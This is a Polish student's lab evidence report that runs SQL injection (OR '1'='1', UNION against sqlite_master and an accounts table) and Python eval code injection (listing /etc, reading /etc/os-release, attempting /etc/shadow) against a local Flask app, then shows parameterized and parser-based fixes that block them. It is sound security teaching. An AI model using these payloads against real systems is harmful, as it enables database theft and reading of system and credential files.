# Dowody — Laboratorium 7

Środowisko: Docker 29.9.2, obraz `python:3.12-alpine` (Alpine 3.24.4), Flask 3.1.3.
Wszystkie polecenia w katalogu `pliki-dla-studentow`, adres `http://127.0.0.1:8080`.
W Windows: `curl.exe`. Składnia `curl -G --data-urlencode` koduje apostrof, spację i `#`.

## Zadanie 1 — SQL Injection (wersja podatna)

Kod podatny (`app.py`):
```python
zapytanie = "SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '" + klucz + "'"
wiersze = db.execute(zapytanie).fetchall()
```

Polecenia i wyniki:
```text
# 1) legalny klucz
curl -G --data-urlencode "klucz=1234" http://127.0.0.1:8080/sekret
  -> Liczba wierszy: 1 ; anna: Hello world

# 2) sam apostrof
curl -G --data-urlencode "klucz='" http://127.0.0.1:8080/sekret
  -> BLAD: OperationalError: unrecognized token: "'''"
  (zapytanie: ... WHERE klucz = ''' — niezamknięty literał)

# 3) warunek zawsze prawdziwy (wszystkie sekrety)
curl -G --data-urlencode "klucz=' OR '1'='1" http://127.0.0.1:8080/sekret
  -> Liczba wierszy: 4
  Zapytanie po podstawieniu:
  SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' OR '1'='1'
  anna: Hello world / piotr: Top secret / muszkieter: Jeden za wszystkich / admin: Szyfr do sejfu: 7319

# 4) UNION + sqlite_master -> nazwy tabel
curl -G --data-urlencode "klucz=' UNION SELECT type, name FROM sqlite_master -- " http://127.0.0.1:8080/sekret
  -> Liczba wierszy: 2
  table: konta / table: sekrety
  (schemat: CREATE TABLE konta(login TEXT, rola TEXT, email TEXT);
            CREATE TABLE sekrety(klucz TEXT, wlasciciel TEXT, sekret TEXT))

# 5) UNION -> druga tabela konta
curl -G --data-urlencode "klucz=' UNION SELECT login, email FROM konta -- " http://127.0.0.1:8080/sekret
  -> Liczba wierszy: 2
  admin: admin@lab7.example / anna: anna@lab7.example

# klucz z apostrofem (legalny) w wersji podatnej -> błąd
curl -G --data-urlencode "klucz=d'Artagnan" http://127.0.0.1:8080/sekret
  -> BLAD: OperationalError: near "Artagnan": syntax error
```

Zapytanie aplikacji zwraca 2 kolumny, więc UNION też ma 2 kolumny.

## Zadanie 2 — Parametryzacja (po poprawce)

Kod po poprawce:
```python
zapytanie = "SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?"
try:
    with sqlite3.connect(BAZA, uri=True) as db:
        wiersze = db.execute(zapytanie, (klucz,)).fetchall()
except sqlite3.Error:
    app.logger.exception("Blad zapytania sekret dla klucza %r", klucz)
    blad = "Wystapil blad zapytania."
```

Powtórzenie wejść po `docker compose restart web`:
```text
klucz=1234                     -> Liczba wierszy: 1 (anna: Hello world)
klucz='                        -> Liczba wierszy: 0 (bez błędu SQLite)
klucz=' OR '1'='1              -> Liczba wierszy: 0
klucz=' UNION ... sqlite_master-> Liczba wierszy: 0
klucz=' UNION ... konta        -> Liczba wierszy: 0
klucz=d'Artagnan               -> Liczba wierszy: 1 (muszkieter: Jeden za wszystkich)
```
Log serwera (`docker compose logs web`) nie zawiera już `OperationalError` dla ataków;
tekst zapytania w trybie diagnostycznym jest stały: `... WHERE klucz = ?`.

## Zadanie 3 — Code Injection w kalkulatorze

Kod podatny: `wynik = eval(wyrazenie)`.

Ataki (wersja podatna):
```text
curl -G --data-urlencode "wyrazenie=__import__('os').listdir('/etc')" http://127.0.0.1:8080/kalkulator
  -> ['services','shadow','udhcpc','secfixes.d','ssl','issue','sysctl.conf','os-release',
      'fstab','profile','securetty','opt','motd','group','apk','crontabs','nsswitch.conf', ...]

curl -G --data-urlencode "wyrazenie=open('/etc/os-release').read()" http://127.0.0.1:8080/kalkulator
  -> NAME="Alpine Linux"
     ID=alpine
     VERSION_ID=3.24.4
     PRETTY_NAME="Alpine Linux v3.24"

curl -G --data-urlencode "wyrazenie=__import__('os').getuid()" http://127.0.0.1:8080/kalkulator
  -> 1000

# dla chętnych: /etc/shadow
curl -G --data-urlencode "wyrazenie=open('/etc/shadow').read()" http://127.0.0.1:8080/kalkulator
  -> Błąd: [Errno 13] Permission denied: '/etc/shadow'
# proces działa jako UID 1000 (app), nie root -> brak dostępu do /etc/shadow (zob. lab5, uprawnienia).
# docker compose exec web id -> uid=1000(app) gid=1000(app)
```

Kod po poprawce (parser):
```python
DZIALANIA = {"+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.truediv}
WZORZEC = re.compile(r"\s*(-?\d+(?:\.\d+)?)\s*([+\-*/])\s*(-?\d+(?:\.\d+)?)\s*")
# brak parametru -> formularz (200); za długie / brak dopasowania / dziel przez 0 -> 400
```

Testy po poprawce (HTTP + wynik):
```text
2+3                                    -> 200  5
7 / 2                                  -> 200  3.5
-1.5*4                                 -> 200  -6
1/0                                    -> 400  Dzielenie przez zero.
__import__('os').listdir('/etc')       -> 400  Nieprawidlowe wyrazenie.
open('/etc/os-release').read()         -> 400  Nieprawidlowe wyrazenie.
__import__('os').getuid()              -> 400  Nieprawidlowe wyrazenie.
?wyrazenie=   (puste)                  -> 400  Nieprawidlowe wyrazenie.
/kalkulator   (brak parametru)         -> 200  (sam formularz)
2+3abc                                 -> 400  Nieprawidlowe wyrazenie.
'1' x 101 znaków                       -> 400  (limit długości)
```
